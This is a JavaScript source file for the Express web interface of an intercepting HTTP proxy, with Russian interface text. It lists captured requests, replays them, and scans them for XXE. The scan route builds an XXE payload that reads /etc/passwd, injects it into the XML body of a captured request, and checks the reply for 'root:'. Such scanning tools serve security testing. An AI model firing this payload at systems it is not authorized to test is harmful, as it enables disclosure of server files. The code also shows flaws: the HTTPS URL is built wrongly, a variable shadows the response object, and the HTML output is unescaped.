const express = require('express');
const config = require("./config");
const requestModule = require("request-promise");

const createAPIApp = (db) => {
    const app = express();

    app.get('/', (req, res) => {
        const response = `
            <div>
                <div>слушает на порту 8080</div>
                <div>на порту 8000 веб-интерфейс</div>
                <div>/requests – список запросов</div>
                <div>/requests/id – вывод запроса</div>
                <div>/repeat/id – повторная отправка запроса</div>
                <div>/scan/id – сканирование запроса</div>
            </div>
        `;
        res.send(config.startMarkup + response + config.endMarkup);
    });

    app.get('/requests', async (req, res) => {
        let requestsList = '';
        const requests = await db.getRequests();
        requests.forEach((item, index) => {
            const request = JSON.parse(item.request);
            requestsList += `
                <div>
                    <span>id ${index + 1}</span>
                    <span>${request.host}</span>
                    <div>path: ${request.path}</div>
                </div>
                <hr>
            `;
        });
        const response = `
        <div>
            <div>Все запросы</div>
            <div>${requestsList}</div>
        </div>
    `;
        res.send(config.startMarkup + response + config.endMarkup);
    });

    app.get('/requests/:id', async (req, res) => {
        let response = '';
        const request = JSON.parse((await db.getRequest(req.params.id)).request);
        if (request) {
            response = `
                <div>${request.host}</div>
                <div>path: ${request.path}</div>
                <hr>
            `;
        } else {
            response = `<div>Нет запроса с id = ${req.params.id}</div>`;
        }
        res.send(config.startMarkup + response + config.endMarkup);
    });

    app.get('/repeat/:id', async (req, res) => {
        let response = '';
        const request = JSON.parse((await db.getRequest(req.params.id)).request);
        if (request) {
            console.log('Repeat HTTP request to', request.path);
            const body = await requestModule(request.path, request);

            response = `
                <div>${request.host} повторно!</div>
                <div>
                    <div>path: ${request.path}</div>
                    <div>Ответ:</div>
                </div>
                <div>${body}</div>
                <hr>
            `;
        } else {
            response = `<div>Нет запроса с id = ${req.params.id}</div>`;
        }
        res.send(config.startMarkup + response + config.endMarkup);
    });

    app.get('/scan/:id', async (req, res) => {
        const xxePayload = '\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n<foo>&xxe;</foo>\n';
        const request = JSON.parse((await db.getRequest(req.params.id)).request);

        if (!request) {
            const response = '<div>Нет запроса с таким id!</div>';
            res.send(config.startMarkup + response + config.endMarkup);
            return;
        }

        let response = '<div>Сканирование запроса</div>';
        console.log('Scanning HTTP request to', request.path);
        if (request.body === '' || request.body.match(/<\?xml/) === null) {
            response += '<div>No XXE in request</div>';
        } else {
            let str = request.body;
            let arr = str.split('<?xml');
            const border = arr[1].indexOf('>');
            let resStr = arr[0] + arr[1].substring(0, border + 1);
            resStr += xxePayload;
            resStr += arr[1].substring(border + 1, arr[1].length - 1);
            request.body = resStr;

            let url = (request.port === 443) ? 'https://' : 'http://' + `${request.host}${request.path}`;
            const res = await fetch(url, {
                method: request.method,
                headers: request.headers,
                body: (request.method !== 'GET' && request.method !== 'HEAD') ? request.body : undefined,
            });
            const data = await res.text();
            if (data.match(/root:/) === null) {
                response += '<div>No XXE in request</div>';
            } else {
                response += '<div>This request has XXE!</div>';
            }
        }
        res.send(config.startMarkup + response + config.endMarkup);
    });

    return app;
}

module.exports = createAPIApp;
